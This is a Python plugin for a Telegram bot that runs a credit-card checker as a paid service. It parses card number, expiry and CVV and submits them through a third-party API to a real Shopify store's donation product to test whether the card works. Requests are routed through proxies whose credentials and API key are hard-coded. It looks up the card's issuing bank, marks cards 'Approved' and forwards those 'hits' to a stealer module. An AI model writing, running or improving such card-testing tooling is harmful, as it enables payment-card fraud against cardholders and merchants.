from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType
import requests, re, time, httpx
from plugins.func.users_sql import *
from plugins.tools.hit_stealer import send_hit_if_approved
from datetime import date

session = requests.Session()

@Client.on_message(filters.command("sf", prefixes=["/", "."]))
async def cmd_sf(client, message):
    try:
        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        chat_id = message.chat.id
        chat_type = message.chat.type

        regdata = fetchinfo(user_id)
        if not regdata:
            return await message.reply_text("❌ You are not registered. Use /register first.")

        role = (regdata[2] or "FREE").strip().upper()
        credit = int(regdata[5] or 0)
        wait_time = int(regdata[6] or (15 if role == "FREE" else 5))
        antispam_time = int(regdata[7] or 0)
        now = int(time.time())

        if chat_type == ChatType.PRIVATE and role == "FREE":
            return await message.reply_text(
                "⚠️ <b>Premium Users Required</b>\n"
                "Only Premium users can use this command in bot PM.\n"
                "Join our group to use it for FREE:",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("Join Group", url="https://t.me/+Rl9oTRlGfbIwZDhk")]
                ]),
                disable_web_page_preview=True
            )

        GROUP = open("plugins/group.txt").read().splitlines()
        if chat_type in [ChatType.GROUP, ChatType.SUPERGROUP] and str(chat_id) not in GROUP:
            return await message.reply_text("❌ Unauthorized group. Contact admin.")

        if credit < 1:
            return await message.reply_text("❌ Insufficient credit.")
        if now - antispam_time < wait_time:
            return await message.reply_text(f"⏳ AntiSpam: wait {wait_time - (now - antispam_time)}s")

        cc_text = None
        if message.reply_to_message:
            cc_text = message.reply_to_message.text or message.reply_to_message.caption
        elif len(message.text.split(maxsplit=1)) > 1:
            cc_text = message.text.split(maxsplit=1)[1]

        if not cc_text:
            return await message.reply_text("❌ Usage: /sf <cc|mm|yy|cvv>")

        match = re.search(r'(\d{12,16})[^\d]?(\d{1,2})[^\d]?(\d{2,4})[^\d]?(\d{3,4})', cc_text)
        if not match:
            return await message.reply_text("❌ Invalid format. Use cc|mm|yy|cvv")

        ccnum, mes, ano, cvv = match.groups()
        fullcc = f"{ccnum}|{mes}|{ano}|{cvv}"

        check_msg = await message.reply_text(f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 5$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> Checking...
<b>⊙ Response:</b> Waiting...
""")

        tic = time.perf_counter()

        payload = {
            "key": "VDX-SHA2X-NZ0RS-O7HAM",
            "data": {
                "card": fullcc,
                "product_url": "https://wcbbstore.com/products/donate?variant=40108999835747",
                "email": None,
                "proxy": "proxy.speedproxies.net:12321:Indexui184a999e:4fba9e5235e8_country-us",
                "ship_address": None,
                "is_shippable": False
            }
        }

        try:
            async with httpx.AsyncClient(timeout=20) as http_client:
                res = await http_client.post("https://api.voidapi.xyz/v2/shopify_graphql", json=payload)
                response = res.json()
                msg_raw = response.get("message") or response.get("error") or "No response"
                msg_check = msg_raw.lower()
                card_status = "approved" if any(x in msg_check for x in ["processedreceipt", "zip", "avs", "incorrect_cvc", "insufficient", "charged"]) else "declined"
                card_message = msg_raw
        except Exception as e:
            card_status = "error"
            card_message = f"Request failed: {e}"

        toc = time.perf_counter()

        try:
            headers = {
                "User-Agent": "Mozilla/5.0",
                "Accept": "application/json"
            }
            proxies = {
                "http": "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000",
                "https": "http://package-1111111-country-us:5671nuWwEPrHCw2t@proxy.rampageproxies.com:5000"
            }
            url = f"https://api.voidex.dev/api/bin?bin={ccnum[:6]}"
            res = session.get(url, headers=headers, proxies=proxies, timeout=15)
            binres = res.json()
            brand = str(binres.get("brand") or binres.get("scheme") or "N/A").upper()
            type_ = str(binres.get("type", "N/A")).upper()
            level = str(binres.get("level", "N/A")).upper()
            bank = str(binres.get("bank", "N/A")).upper()
            country = str(binres.get("country_name", "N/A")).upper()
            flag = binres.get("country_flag") or "🏳️"
        except Exception as e:
            print("[DEBUG] BIN Proxy Error:", str(e))
            brand = type_ = level = bank = country = "N/A"
            flag = "🏳️"

        status = "Approved ✅" if card_status == "approved" else "Declined ❌"

        final_msg = f"""
<code>┏━━━━━━━⍟</code>
<b>┃  Shopify 5$</b>
<code>┗━━━━━━━━━━━⊛</code>
<b>⊙ CC:</b> <code>{fullcc}</code>
<b>⊙ Status:</b> {status}
<b>⊙ Response:</b> {card_message}
<b>⊙ Bank:</b> {bank}
<b>⊚ Bin type:</b> {brand} - {type_} - {level}
<b>⊙ Country:</b> {country} {flag}
<b>⊙ Time:</b> {toc - tic:.2f}s
<b>❛ ━━━━・⌁ 𝑩𝑨𝑹𝑹𝒀 ⌁・━━━━ ❜</b>
"""

        await client.edit_message_text(chat_id, check_msg.id, final_msg)

        if "approved" in status.lower() or "live" in card_message.lower():
            await send_hit_if_approved(client, final_msg)

        updatedata(user_id, "credits", credit - 1)
        updatedata(user_id, "antispam_time", now)
        plan_expirychk(user_id)

    except Exception as e:
        await message.reply_text(f"❌ Error: {str(e)}")
